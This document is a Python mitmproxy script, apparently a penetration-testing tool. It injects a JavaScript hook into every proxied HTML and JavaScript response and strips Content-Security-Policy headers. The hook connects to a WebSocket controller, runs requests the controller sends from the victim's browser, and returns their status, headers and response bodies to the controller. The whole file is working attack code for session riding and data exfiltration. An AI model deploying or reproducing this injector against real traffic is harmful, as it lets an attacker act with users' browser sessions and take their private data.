from mitmproxy import http


def response(flow: http.HTTPFlow) -> None:
    # domain = "baidu.com"
    domain = "*"
    jscode = '''/*
     * @Time    : 2024/4/9 15:38
     * @Author  : E0tk1
     * @File    : 浏览器端.js
     */
    const socket = new WebSocket('ws://127.0.0.1:8765');
    // const socket = new WebSocket('ws://10.12.30.22:8765');

    // 连接建立时
    socket.onopen = function(event) {
        // 发送身份验证信息
        socket.send('password=123456');
    };

    // 接收到消息时
    socket.onmessage = function(event) {
        // 处理接收到的消息
        const receivedMessage = event.data;

        // 分割ws服务端发来的消息（分割后的数据：
        const parts = receivedMessage.split("------");

        // 校验码
        const varChars = parts[0]

        // 整体数据
        const reqdata = parts[1]

        if (parts.length == 2) {
            try {
                // 以"[][][][][][]"字符分割数据
                const [newdata1, newdata2, newdata3, newdata4, newdata5] = reqdata.split("[][][][][][]");
                // console.log("New Data 1:", newdata1);    // GET或POST
                // console.log("New Data 2:", newdata2);    // URL
                // console.log("New Data 3:", newdata3);    // content-type
                // console.log("New Data 4:", newdata4);    // DATA
                // console.log("New Data 5:", newdata5);    // headers
                // newdata4 = atob(newdata4);

                // 如果存在自定义header头则在此添加
                const fetchOptions = {};
                const headers = {};
                if (newdata5 !== undefined && newdata5 !== null && newdata5 !== '') {
                    const headersArray = newdata5.split('|||').map(header => header.trim().split(': '));
                    headersArray.forEach(([key, value]) => {
                        headers[key] = value;
                    });
                }
                // 默认GET，如果是POST则进入判断
                if (newdata1 === 'POST') {
                    let str_str = newdata4;
                    fetchOptions["method"] = 'POST';
                    if (newdata3 === 'json') {
                        // 如果是json类型，字符串转换为json
                        try {
                            str_str = JSON.parse(str_str);
                        } catch (error) {
                            throw new Error('Failed to parse JSON data');
                        }
                        fetchOptions["body"] = JSON.stringify(str_str);
                        headers["Content-Type"] = 'application/json';
                    } else if (newdata3 === 'xfrom') {
                        // 如果是json类型，解析 newdata4 格式
                        const params = new URLSearchParams();
                        if (str_str !== undefined && str_str !== null && str_str !== '') {
                            const keyValuePairs = str_str.split('&');
                            keyValuePairs.forEach(keyValue => {
                                const [key, value] = keyValue.split('=');
                                params.append(key, value);
                            });
                        }
                        fetchOptions["body"] = params;
                        headers["Content-Type"] = 'application/x-www-form-urlencoded'
                    } else if (newdata3 === 'formdata') {
                        // 如果是formdata类型，解析 newdata4 格式
                        const formData = new FormData();
                        if (newdata4 !== undefined && newdata4 !== null && newdata4 !== '') {
                            const keyValuePairs = newdata4.split('&');
                            keyValuePairs.forEach(keyValue => {
                                const [key, value] = keyValue.split('=');
                                formData.append(key, value);
                            });
                        }
                        fetchOptions["body"] = formData;
                        headers["Content-Type"] = 'multipart/form-data; boundary=----WebKitFormBoundary4PvJtCrxXwKMSAs1';
                    }
                }
                if (Object.keys(headers).length > 0) {
                    fetchOptions.headers = new Headers(headers);
                }
                // 发送请求
                fetch(newdata2, fetchOptions)
                .then(response => {
                    // 获取状态码
                    const statusCode = response.status.toString(); 

                    // 获取响应头
                    const headersJson = {};
                    response.headers.forEach((value, name) => {
                        headersJson[name] = value;
                    });
                    headersString = JSON.stringify(headersJson);

                    // 获取响应体
                    xydata = response.text();

                    return xydata.then(xydata => {
                        return {
                            statusCode: statusCode,
                            headersString: headersString,
                            xydata: xydata
                        };
                    });
                })
                .then(({ statusCode, headersString, xydata }) => {
                    // 请求成功，将校验码、状态码、响应头、响应体以指定格式发给ws服务端
                    socket.send(varChars + '------' + statusCode + '------' + headersString + '------' + xydata);
                })
                .catch(error => {
                    // console.log(error);
                    socket.send(varChars + '------0------0------0');
                });
            } catch (error) {
                // 如果出错
                socket.send(varChars + '------0------0------0');
                console.error("Error processing new data：", error);
            }
        }
    };'''
    if flow.request.pretty_host.endswith(domain) or domain == "*":
        content_type = flow.response.headers.get("Content-Type", "").lower()
        if content_type.startswith("application/javascript"):
            # 如果响应的 Content-Type 是 JavaScript
            flow.response.text += jscode
        elif content_type.startswith("text/html"):
            # 如果响应的 Content-Type 是 HTML
            flow.response.text += "<script>" + jscode + "</script>"

    # 如果有csp策略则删除
    if "Content-Security-Policy" in flow.response.headers:
        # 删除 Content-Security-Policy 字段
        del flow.response.headers["Content-Security-Policy"]